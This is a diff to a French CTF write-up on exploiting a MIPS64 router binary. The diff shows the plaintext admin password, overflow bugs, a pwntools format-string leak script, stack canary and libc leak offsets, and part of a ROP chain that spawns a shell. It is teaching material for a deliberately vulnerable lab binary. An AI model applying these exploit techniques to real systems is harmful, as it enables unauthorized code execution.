@@ -20,7 +20,7 @@ Gadget au clavier !
 Ce challenge a été créé pour la première édition du CTF Shutlock.
 Il a pour objectif d'introduire à l'architecture MIPS64.
 
-## Solve
+## Solution
 
 ### TL;DR
 
@@ -37,6 +37,10 @@ Vulnérabilités :
 
 ### Comportement général du binaire vulnérable
 
+Nous arrivons dans ce challenge avec deux fichiers donnés et un objectif : retrouver le message à travers le routeur.
+
+Nous commençons par nous connecter au challenge afin de voir son comportement.
+
 ````shell
 └─$ nc challenges.shutlock.fr 50008
 *** Welcome to Loki routeur ***
@@ -49,9 +53,12 @@ Vulnérabilités :
 #>
 ````
 
-### Uncompress initial ramdisk
+Le routeur semble appartenir à un certain `Loki` et comporte plusieurs options en boucle.
 
-La première étape est de récupérer le binaire ainsi que la libc 
+### Décompresser l'initial ramdisk
+
+La première étape est par la suite de récupérer le binaire ainsi que la libc. 
+Pour cela, nous allons décompresser l'initrd.
 
 ````shell
 └─$ file initrd
@@ -126,6 +133,8 @@ On récupère ainsi la libc.so.6 ainsi que le binaire vulnérable _vuln_.
 
 ### Déterminer l'architecture et protection du binaire
 
+Une fois le binaire récupéré, nous allons déterminer son architecture ainsi que ses protections.
+
 ````shell
 └─$ file vuln
 vuln: ELF 64-bit LSB pie executable, MIPS, MIPS64 rel2 version 1 (SYSV), dynamically linked, interpreter /lib64/ld.so.1, BuildID[sha1]=6ea60cbe84bbc69711720b5b440f28bf594f69dd, for GNU/Linux 3.2.0, with debug_info, not stripped
@@ -139,9 +148,11 @@ vuln: ELF 64-bit LSB pie executable, MIPS, MIPS64 rel2 version 1 (SYSV), dynamic
     PIE:      PIE enabled
 ````
 
-C'est en mips64 little endian binary dynamically linked avec des informations de debugging 
+C'est en mips64 little endian, dynamically linked avec des informations de debugging 
 
 ### Lancer le binaire en local 
+
+Maintenant que nous avons déterminé son architecture, nous pouvons le lancer localement.
 
 ````shell
 └─$ qemu-system-mips64el \
@@ -155,21 +166,14 @@ C'est en mips64 little endian binary dynamically linked avec des informations de
     -nographic \
     -no-reboot
 ````
-## Trouver le mot de passe admin
 
-Le mot de passe est en clair dans le binaire.
-
-````text
-.text:0000000000001B08                 daddiu  $a1, $v0, aAdmin  # "admin"
-.text:0000000000001B0C                 ld      $a0, 0x18+var_18($fp)  # s1
-.text:0000000000001B10                 dla     $v0, strcmp      # Load 64-bit address
-````
 ## Vulnérabilités
 
 L'objectif est de trouver les vulnérabilités du binaire afin de retrouver le contenu du dernier message pour déjouer une attaque sur les JO.
 
 On utilise ici le code source pour mieux comprendre les vulnérabilités.
 On peut faire de même avec le binaire compilé en utilisant des outils de désassemblage comme IDA.
+
 ### Heap overflow 
 
 ````C
@@ -210,22 +214,27 @@ typedef struct info {
 - Vulnérabilité : Buffer Overflow / ROP
 - Utilité : Grâce à la précédente augmentation du paramètre len, la fonction fgets prend en paramètre une len plus grande que prévue nous permettant d'effectuer un rop
 
-## Flag
 
-Une fois la machine pwn, on retrouve le flag dans **/flag/flag.txt**
+## Trouver le mot de passe admin
 
-Visible grâce : 
+Afin de pouvoir réécrire le champ `len` dans la fonction `Change_Wifi_Key` il nous faut déterminer le mot de passe administrateur.
+On recherche ainsi le mot de passe dans le binaire.
 
-````C
-void Connect_NAS(){
-    printf("Loki's NAS connected in path /flag/!\n");
-};
+Une chance qu'il soit écrit en claire !
+
+````text
+.text:0000000000001B08                 daddiu  $a1, $v0, aAdmin  # "admin"
+.text:0000000000001B0C                 ld      $a0, 0x18+var_18($fp)  # s1
+.text:0000000000001B10                 dla     $v0, strcmp      # Load 64-bit address
 ````
+
 ## ROP
 
 ### Déterminer la stack
 
-Lancer le binaire avec l'option -g (attendre la connexion gdb sur le port)
+La prochaine étape est d'exécuter un ROP afin d'avoir accès aux communications.
+
+On va lancer le binaire avec l'option -g (attendre la connexion gdb sur le port)
 
 ````shell
  qemu-mips64el -L /usr/mips64el-linux-gnuabi64/ -g 4000 ./vuln
@@ -242,7 +251,7 @@ target remote localhost:4000
 info proc map
 ````
 
-Lancer gdb et mettre un breakpoint sur la fonction _Connect_TO_WIFI_
+On va lancer gdb et mettre un breakpoint sur la fonction _Connect_TO_WIFI_
 
 ````shell
 └─$ gdb-multiarch
@@ -543,17 +552,15 @@ buf += p64(bin_sh_addr)                  # Valeur pour $a0 (adresse de la chaîn
 
 Ainsi, cette chaîne d'instructions utilise des gadgets pour manipuler les registres et la pile, menant à l'appel de `system("/bin/sh")`, ouvrant un shell.
 
-
-
 ## Trouver les leaks
 
-Lancer le binaire en local 
+Afin de trouver les leaks, on commence par lancer le binaire en local en boucle.
 
 ````shell
 socat tcp-listen:4000,reuseaddr,fork exec:"qemu-mips64el -L /usr/mips64el-linux-gnuabi64/ ./vuln"
 ````
 
-Script permettant de leak les adresses grâce à la vulnérabilité format string :
+On utilise ce script qui va permettre de leak les adresses grâce à la vulnérabilité format string :
 
 ````python
 from pwn import * # CONNECT:
@@ -607,7 +614,7 @@ for i in range(350):
 └─$ python3 find_leak.py > local_addr.txt
 ````
 
-Nettoyer la sortie pour rendre les adresses plus lisibles :
+On nettoie la sortie pour rendre les adresses plus lisibles :
 
 ````shell
 0: b'%0$p'
@@ -639,7 +646,7 @@ La canary se trouve donc à l'offset 19 !
 
 ### Trouver un leak de la libc
 
-Sur gdb, on regarde les adresses qui correspondent à ceux de la libc
+Afin de trouver les addresses de la libc, on utilise gdb pour regarder les adresses correspondantes.
 
 ````shell
 gdb-peda$ info proc map
@@ -667,7 +674,7 @@ Mapped address spaces:
       0x7f5e6e6c7000     0x7f5e6e6c8000     0x1000     0x2000  rw-p   /CTF/Shutlock-2024/Inspecteur_Gadget/vuln
 ````
 
-On regarde les adresses qui peuvent y correspondre
+On regarde sur nos addresses leak celles qui peuvent correspondre
 
 ````txt
 66: b'0x555555d55ef8'
